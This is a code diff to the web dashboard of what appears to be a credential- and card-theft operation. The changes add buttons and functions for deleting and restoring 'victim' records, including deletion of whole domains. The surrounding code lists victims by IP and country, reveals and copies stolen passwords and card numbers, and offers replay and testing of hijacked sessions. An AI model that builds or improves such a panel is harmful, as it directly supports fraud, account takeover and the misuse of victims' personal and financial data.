@@ -441,6 +441,8 @@
         .btn-icon-sm.download:hover { background: rgba(245,158,11,0.08); }
         .btn-icon-sm.eye { border-color: #3b82f6; color: #3b82f6; }
         .btn-icon-sm.eye:hover { background: rgba(59,130,246,0.08); }
+        .btn-icon-sm.delete-sm { border-color: #ff4444; color: #ff4444; }
+        .btn-icon-sm.delete-sm:hover { background: rgba(255,68,68,0.15); }
 
         .domain-grid {
             display: grid;
@@ -550,6 +552,17 @@
         }
         .domain-card .meta .latest-time { color: #64748b; }
         .domain-card .meta .latest-time .time-text { color: #94a3b8; }
+        .domain-card .meta .delete-domain-btn {
+            color: #ff4444;
+            cursor: pointer;
+            font-size: 9px;
+            padding: 0 4px;
+            border-radius: 3px;
+            border: 1px solid #ff4444;
+            background: transparent;
+            transition: 0.2s;
+        }
+        .domain-card .meta .delete-domain-btn:hover { background: rgba(255,68,68,0.15); }
 
         .domain-card .actions {
             margin-top: 8px;
@@ -575,6 +588,8 @@
         .domain-card .actions .btn-sm.test:hover { background: rgba(59,130,246,0.08); }
         .domain-card .actions .btn-sm.download { border-color: #f59e0b; color: #f59e0b; }
         .domain-card .actions .btn-sm.download:hover { background: rgba(245,158,11,0.08); }
+        .domain-card .actions .btn-sm.delete { border-color: #ff4444; color: #ff4444; }
+        .domain-card .actions .btn-sm.delete:hover { background: rgba(255,68,68,0.15); }
 
         .view-content { display: none; }
         .view-content.active { display: block; }
@@ -631,6 +646,7 @@
             padding: 12px 14px;
             transition: 0.2s;
             cursor: pointer;
+            position: relative;
         }
         .victim-card:hover { border-color: #2a3a5a; transform: translateY(-2px); box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
         .victim-card .v-header { display: flex; align-items: center; gap: 6px; margin-bottom: 4px; }
@@ -640,6 +656,20 @@
         .victim-card .v-details .domain { color: #00ff88; }
         .victim-card .v-details .time { color: #475569; }
         .victim-card .v-cookies { font-size: 9px; color: #f59e0b; margin-top: 2px; }
+        .victim-card .v-delete {
+            position: absolute;
+            top: 6px;
+            right: 6px;
+            background: transparent;
+            border: none;
+            color: #475569;
+            font-size: 12px;
+            cursor: pointer;
+            transition: 0.2s;
+            padding: 2px 4px;
+            border-radius: 4px;
+        }
+        .victim-card .v-delete:hover { color: #ff4444; background: rgba(255,68,68,0.1); }
 
         .modal-overlay {
             display: none;
@@ -697,6 +727,7 @@
             gap: 8px;
             margin-bottom: 4px;
             flex-wrap: wrap;
+            padding-right: 70px;
         }
         .modal .victim-entry .victim-header .flag { font-size: 18px; }
         .modal .victim-entry .victim-header .ip { font-family: monospace; font-size: 12px; color: #e2e8f0; font-weight: 600; }
@@ -717,21 +748,33 @@
         .modal .victim-entry .victim-header .time-badge .full-time { color: #94a3b8; }
         .modal .victim-entry .victim-header .time-badge .ago { color: #00ff88; font-weight: 500; }
 
-        .modal .victim-entry .delete-btn {
+        .modal .victim-entry .modal-actions {
             position: absolute;
             top: 8px;
             right: 8px;
-            background: transparent;
-            border: none;
-            color: #475569;
-            font-size: 14px;
-            cursor: pointer;
-            transition: 0.2s;
-            padding: 2px 6px;
-            border-radius: 4px;
-            line-height: 1;
+            display: flex;
+            gap: 4px;
         }
-        .modal .victim-entry .delete-btn:hover { color: #ff4444; background: rgba(255,68,68,0.1); }
+        .modal .victim-entry .modal-actions .btn-icon-sm {
+            padding: 0 6px;
+            font-size: 12px;
+            line-height: 22px;
+            height: 24px;
+        }
+        .modal .victim-entry .modal-actions .btn-icon-sm.delete-sm {
+            border-color: #ff4444;
+            color: #ff4444;
+        }
+        .modal .victim-entry .modal-actions .btn-icon-sm.delete-sm:hover {
+            background: rgba(255,68,68,0.15);
+        }
+        .modal .victim-entry .modal-actions .btn-icon-sm.restore-sm {
+            border-color: #00ff88;
+            color: #00ff88;
+        }
+        .modal .victim-entry .modal-actions .btn-icon-sm.restore-sm:hover {
+            background: rgba(0,255,136,0.08);
+        }
 
         .modal .victim-entry .data-section {
             margin-top: 4px;
@@ -968,20 +1011,6 @@
         .powered-footer { text-align: center; font-size: 10px; color: #1e293b; margin-top: 16px; padding-top: 12px; border-top: 1px solid #1a2538; }
         .powered-footer .name { color: #00ff88; font-weight: 600; }
 
-        .data-item-link {
-            color: #00ff88;
-            text-decoration: none;
-            font-size: 9px;
-            word-break: break-all;
-            cursor: pointer;
-            border: 1px solid #1a2538;
-            padding: 0 6px;
-            border-radius: 4px;
-            background: #0f1626;
-        }
-        .data-item-link:hover { background: #1a2538; border-color: #00ff88; }
-
-        /* RESPONSIVE — FULLY ADAPTIVE */
         @media (max-width: 992px) { .domain-grid { grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); } }
         @media (max-width: 768px) {
             .sidebar { position: fixed; top: 0; left: 0; transform: translateX(-260px); width: 260px; height: 100vh; z-index: 150; border-right: 1px solid #1a2538; box-shadow: 4px 0 40px rgba(0,0,0,0.5); }
@@ -1002,6 +1031,7 @@
             .modal .victim-entry .data-section .data-item { flex-wrap: wrap; }
             .modal .victim-entry .data-section .data-item .label { min-width: 40px; }
             .modal .victim-entry .data-section .data-item .actions { margin-top: 2px; }
+            .modal .victim-entry .victim-header { padding-right: 50px; }
         }
         @media (max-width: 480px) {
             .stats-row { grid-template-columns: 1fr; }
@@ -1027,6 +1057,7 @@
             .sidebar .contact-support { font-size: 10px; padding: 4px 10px; }
             .modal .session-actions .btn { font-size: 10px; padding: 4px 10px; }
             .btn-icon-sm { font-size: 8px; padding: 0 4px; height: 18px; line-height: 18px; }
+            .modal .victim-entry .modal-actions .btn-icon-sm { font-size: 10px; height: 20px; line-height: 20px; }
         }
         @media (max-width: 360px) {
             .main { padding: 10px; padding-top: 48px; }
@@ -1194,7 +1225,7 @@
             </div>
         </div>
 
-        <!-- VIEW: VICTIMS — clickable to open modal -->
+        <!-- VIEW: VICTIMS -->
         <div class="view-content" id="viewVictims">
             <div class="toolbar" style="margin-bottom:12px;">
                 <div class="left"><span style="color:#64748b;font-size:12px;">All victims — click to view details</span></div>
@@ -1416,7 +1447,7 @@
     <div class="toast" id="toast"></div>
 
     <!-- ============================================================
-    DASHBOARD LOGIC — ALL FEATURES
+    DASHBOARD LOGIC — ALL FEATURES + DELETE BUTTON
     ============================================================ -->
     <script>
         // ============================================================
@@ -1765,12 +1796,16 @@
                     <div class="victims-list">${victimsHtml}</div>
                     <div class="meta">
                         <span class="latest-time">🕐 <span class="time-text">${latestTimeFormatted}</span></span>
-                        <span>${stats.entries.length} total</span>
+                        <span>
+                            ${stats.entries.length} total
+                            <button class="delete-domain-btn" onclick="event.stopPropagation(); showDeleteDomainConfirm('${domain}')">🗑️</button>
+                        </span>
                     </div>
                     <div class="actions">
                         <button class="btn-sm replay" onclick="event.stopPropagation(); replaySession('${domain}')">▶️</button>
                         <button class="btn-sm test" onclick="event.stopPropagation(); testSession('${domain}')">🔍</button>
                         <button class="btn-sm download" onclick="event.stopPropagation(); downloadDomain('${domain}')">📥</button>
+                        <button class="btn-sm delete" onclick="event.stopPropagation(); showDeleteDomainConfirm('${domain}')">🗑️</button>
                     </div>
                 `;
                 card.onclick = () => openModal(domain, stats, 'main');
@@ -1850,7 +1885,7 @@
         }
 
         // ============================================================
-        // CREDENTIALS VIEW — with link, copy, eye
+        // CREDENTIALS VIEW
         // ============================================================
 
         function renderCredsView() {
@@ -1904,7 +1939,6 @@
             `;
 
             allCreds.slice(0, 200).forEach((cred, idx) => {
-                const uid = 'cred-' + idx;
                 const escapedValue = cred.value.replace(/'/g, "\\'");
                 const visKey = 'cred-vis-' + idx;
                 const isVisible = passwordVisibility[visKey] || false;
@@ -1935,7 +1969,7 @@
         }
 
         // ============================================================
-        // CARDS VIEW — with link, copy, eye for card number
+        // CARDS VIEW
         // ============================================================
 
         function renderCardsView() {
@@ -1992,7 +2026,6 @@
             `;
 
             allCards.slice(0, 200).forEach((card, idx) => {
-                const uid = 'card-' + idx;
                 const escapedValue = card.value.replace(/'/g, "\\'");
                 const visKey = 'card-vis-' + idx;
                 const isVisible = passwordVisibility[visKey] || false;
@@ -2090,7 +2123,7 @@
         }
 
         // ============================================================
-        // VICTIMS VIEW — clickable cards
+        // VICTIMS VIEW
         // ============================================================
 
         function renderVictimsView() {
@@ -2126,6 +2159,7 @@
 
                 html += `
                     <div class="victim-card" onclick="openModalForEntry('${entry._uniqueId}')">
+                        <button class="v-delete" onclick="event.stopPropagation(); showDeleteConfirm('${entry._uniqueId}', '${domain}')" title="Delete victim">🗑️</button>
                         <div class="v-header">
                             <span class="flag">${flag}</span>
                             <span class="ip">${entry.ip || 'Unknown'}</span>
@@ -2145,7 +2179,7 @@
         }
 
         // ============================================================
-        // MODAL — DETAILED VIEW with links, copy, eye, download
+        // MODAL — WITH DELETE BUTTON
         // ============================================================
 
         function openModalForEntry(uniqueId) {
@@ -2165,7 +2199,8 @@
             currentModalDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
 
             const overlay = document.getElementById('modalOverlay');
-            const title = source === 'trash' ? `🗑️ ${currentModalDomain} — Deleted` :
+            const isTrash = source === 'trash';
+            const title = isTrash ? `🗑️ ${currentModalDomain} — Deleted` :
                           `👤 ${currentModalDomain} — Victim Details`;
 
             document.getElementById('modalTitle').textContent = title;
@@ -2173,7 +2208,6 @@
             const flag = getFlagEmoji(entry.countryCode);
             const fullTime = formatFullTime(entry.receivedAt);
             const ago = timeAgo(entry.receivedAt);
-            const isTrash = source === 'trash';
 
             const ua = entry.fingerprint?.userAgent || '';
             let browser = 'Unknown';
@@ -2190,8 +2224,20 @@
             const creds = entry.credentials || [];
             const cards = entry.cards || [];
 
+            const deleteBtn = isTrash ?
+                `<button class="btn-icon-sm delete-sm" onclick="showPermanentDeleteConfirm('${entry._uniqueId}')">🗑️</button>` :
+                `<button class="btn-icon-sm delete-sm" onclick="showDeleteConfirm('${entry._uniqueId}', '${currentModalDomain}')">🗑️</button>`;
+
+            const restoreBtn = isTrash ?
+                `<button class="btn-icon-sm restore-sm" onclick="showRestoreConfirm('${entry._uniqueId}', '${currentModalDomain}')">↩️</button>` :
+                '';
+
             let html = `
                 <div class="victim-entry">
+                    <div class="modal-actions">
+                        ${restoreBtn}
+                        ${deleteBtn}
+                    </div>
                     <div class="victim-header">
                         <span class="flag">${flag}</span>
                         <span class="ip">${entry.ip}</span>
@@ -2308,6 +2354,47 @@
         }
 
         // ============================================================
+        // DELETE DOMAIN CONFIRM
+        // ============================================================
+
+        function showDeleteDomainConfirm(domain) {
+            // Count how many victims in this domain
+            const count = allData.filter(e => {
+                const d = e.fingerprint?.hostname || e.domain || 'unknown';
+                return d === domain;
+            }).length;
+            showCustomConfirm(
+                'Delete Domain',
+                `Delete ALL ${count} victims from ${domain}?`,
+                '🗑️',
+                () => { deleteDomain(domain); },
+                true
+            );
+        }
+
+        async function deleteDomain(domain) {
+            const toDelete = allData.filter(e => {
+                const d = e.fingerprint?.hostname || e.domain || 'unknown';
+                return d === domain;
+            });
+
+            let deleted = 0;
+            for (const entry of toDelete) {
+                if (entry._uniqueId) {
+                    try {
+                        const res = await fetch(`/api/delete/${entry._uniqueId}`, { method: 'DELETE' });
+                        if (res.status === 401) { window.location.href = '/login.php'; return; }
+                        const data = await res.json();
+                        if (data.status === 'ok') deleted++;
+                    } catch (e) {}
+                }
+            }
+            showToast(`🗑️ Deleted ${deleted} victims from ${domain}`, 'success');
+            await fetchData();
+            await fetchTrash();
+        }
+
+        // ============================================================
         // PASSWORD VISIBILITY TOGGLE
         // ============================================================
 
@@ -2323,7 +2410,6 @@
                     el.textContent = el.textContent.replace(/[^\s]/g, '•');
                 }
             }
-            // Store original value if not set
             if (el && !el.dataset.originalValue) {
                 el.dataset.originalValue = el.textContent;
             }
@@ -2337,7 +2423,6 @@
             navigator.clipboard.writeText(text).then(() => {
                 showToast('✅ Copied!', 'success');
             }).catch(() => {
-                // Fallback
                 const ta = document.createElement('textarea');
                 ta.value = text;
                 ta.style.position = 'fixed';
@@ -2755,7 +2840,7 @@
         }
 
         // ============================================================
-        // DELETE FUNCTIONS
+        // DELETE FUNCTIONS (full implementation)
         // ============================================================
 
         function showDeleteConfirm(uniqueId, domain) {
